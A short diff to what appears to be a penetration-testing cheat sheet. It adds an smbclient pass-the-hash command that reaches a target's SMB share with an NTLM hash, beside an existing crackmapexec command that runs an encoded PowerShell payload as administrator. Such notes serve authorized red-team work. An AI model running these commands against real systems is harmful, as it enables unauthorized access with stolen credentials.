@@ -109,6 +109,11 @@ wmiexec with hash:
 ```bash
 crackmapexec smb -u administrator -H $HASH -X "powershell -e ..."
 ```
+smbclient:
+#pass-the-hash 
+```bash
+smbclient \\\\$TARGET_IP\\$SHARE -U Administrator --pw-nt-hash $HASH
+```
 
 Try to connect to console:
 
